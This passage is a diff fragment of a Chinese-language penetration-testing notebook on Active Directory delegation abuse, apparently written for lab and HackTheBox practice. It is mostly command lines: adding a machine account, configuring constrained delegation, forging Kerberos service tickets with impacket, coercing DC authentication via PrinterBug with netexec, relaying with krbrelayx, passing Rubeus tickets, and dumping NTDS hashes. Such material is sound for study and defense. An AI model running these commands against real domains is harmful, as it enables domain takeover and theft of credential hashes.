+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>netexec smb $ip -u <span style="color:#e6db74">&#34;FS01</span>$<span style="color:#e6db74">&#34;</span> -p <span style="color:#e6db74">&#39;WACKmaker!1&#39;</span> -M coerce_plus -o LISTENER<span style="color:#f92672">=</span>FS01.$domain METHOD<span style="color:#f92672">=</span>PrinterBug
+</span></span></code></pre></div><p>一切正常的情况下中继处会有回显，并且截获dc的tgt</p>
+<h4 id="创建约束委派">创建约束委派
+</h4><p>我还没有时间去研究远程打法（bloodyady一定能做到），所以目前先记录winrm命令打法</p>
+<p>要求：允许创建机器用户或者已经存在一个我们完全掌握的机器
+使用工具：winrm,nxc</p>
+<p>首先创建机器用户或者修改以拥有机器用户的密码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>impacket-addcomputer -computer-name FS01 -computer-pass WACKmaker!1 -dc-ip $ip $domain/$user:$pass
+</span></span></code></pre></div><p>在winrm上创建约束委派，配置fs01对dc的ldap约束委派</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span><span style="color:#75715e"># 配置约束委派启用</span>
+</span></span><span style="display:flex;"><span>Set-ADAccountControl -Identity <span style="color:#e6db74">&#34;FS01</span>$<span style="color:#e6db74">&#34;</span> -TrustedToAuthForDelegation $True
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 指定委派目标服务</span>
+</span></span><span style="display:flex;"><span>Set-ADObject -Identity <span style="color:#e6db74">&#34;CN=FS01,CN=COMPUTERS,DC=</span>$DOMAIN<span style="color:#e6db74">,DC=VL&#34;</span> -Add @<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;msDS-AllowedToDelegateTo&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ldap/</span>$dc_FQDN<span style="color:#e6db74">&#34;</span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>之后正常打约束委派</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>sudo ntpdate $ip
+</span></span><span style="display:flex;"><span>impacket-getTGT $domain/$user:$pass -dc-ip $ip
+</span></span><span style="display:flex;"><span>export KRB5CCNAME<span style="color:#f92672">=</span>FS01<span style="color:#ae81ff">\$</span>.ccache 
+</span></span><span style="display:flex;"><span>impacket-getST -spn ldap/$dc_FQDN -impersonate dc $domain/$user -k -no-pass -dc-ip $ip
+</span></span><span style="display:flex;"><span>KRB5CCNAME<span style="color:#f92672">=</span>dc@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache nxc smb $ip --use-kcache --ntds --user Administrator
+</span></span></code></pre></div><h2 id="高权限组利用">高权限组利用
 </h2><h3 id="windows-2000-compatible-accesswindows-2000-之前兼容的访问组">Windows 2000 Compatible Access（Windows 2000 之前兼容的访问组）
 </h3><p>虽然名字邮电长，但他确实是默认组，用于在 Windows 2000 之前兼容权限</p>
 <p>对我们渗透来说它有一个非常有趣的点，如果这个组里机器用户是FS01$，则它的计算机密码可能是fs01</p>
@@ -2295,7 +2404,17 @@ nxc</p>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>.\Rubeus.exe monitor /interval<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">5</span> /filteruser<span style="color:#960050;background-color:#1e0010">:</span>CDC01$
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>.\SpoolSample.exe CDC01 APPSRV01
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Rubeus.exe ptt /ticket<span style="color:#960050;background-color:#1e0010">:</span>doIFIjCCBR.......
-</span></span></code></pre></div><h3 id="约束">约束
+</span></span></code></pre></div><h4 id="nxc加krbrelayx">nxc加krbrelayx
+</h4><p>启用krbrelayx来指定中继，注意这里需要我们配置无约束委派机器用户的hash，可以转一下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>iconv -f ASCII -t UTF-16LE &lt;<span style="color:#f92672">(</span>printf <span style="color:#e6db74">&#34;WACKmaker!1&#34;</span><span style="color:#f92672">)</span> | openssl dgst -md4
+</span></span></code></pre></div><p>启动中继监听</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>uv run /opt/krbrelayx/krbrelayx.py -hashes :$hash_machine
+</span></span></code></pre></div><p>使用nxc查询强制身份验证的可用模式</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>netexec smb $ip -u $user -p $pass -M coerce_plus 
+</span></span></code></pre></div><p>哪个可用选哪个，这里使用PrinterBug作为触发中继示例</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>netexec smb $ip -u <span style="color:#e6db74">&#34;FS01</span>$<span style="color:#e6db74">&#34;</span> -p <span style="color:#e6db74">&#39;WACKmaker!1&#39;</span> -M coerce_plus -o LISTENER<span style="color:#f92672">=</span>FS01.$domain METHOD<span style="color:#f92672">=</span>PrinterBug
+</span></span></code></pre></div><p>一切正常的情况下中继处会有回显，并且截获dc的tgt,之后直接打dcsync</p>
+<h3 id="约束">约束
 </h3><h4 id="可转发情况">可转发情况
 </h4><h5 id="rubeus-1">rubeus
 </h5><p>为可以约束委派的用户请求tgt</p>
@@ -2319,7 +2438,8 @@ nxc</p>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>impacket-getST -spn $spn -impersonate administrator $domain/$user -k -no-pass -dc-ip $ip
 </span></span><span style="display:flex;"><span>例如下
 </span></span><span style="display:flex;"><span>impacket-getST -spn CIFS/DC.painters.htb -impersonate administrator $domain/$user -k -no-pass -dc-ip $ip
-</span></span></code></pre></div><h4 id="不可转发情况下">不可转发情况下
+</span></span></code></pre></div><p>之后直接dcsync</p>
+<h4 id="不可转发情况下">不可转发情况下
 </h4><p>如果没有启用 Protocol Transition（协议转换），那么 S4U2Self 获取的 ST 是不可转发的，也就无法 S4U2Proxy。</p>
 <p>要求：目前我只会一种特定情况下的不可转发约束委派打法，也就是手动构造rbcd，这需要配置了约束委派的目标为一个机器用户并且这个机器用户还必须有一个自己注册的服务。整体的逻辑就是，既然不允许委派为任意用户，我们就可以先伪造成任意用户再去委派。</p>
 <p>举例环境：这里为了不混淆，我举例具有委派的机器为delegator$，同时我们还有一个域用户ldap_monitor，并且存在两个服务一个browser一个http，并且browser是delegator$注册的服务，http是约束委派的服务，我会在结尾解释为何需要这两个服务</p>
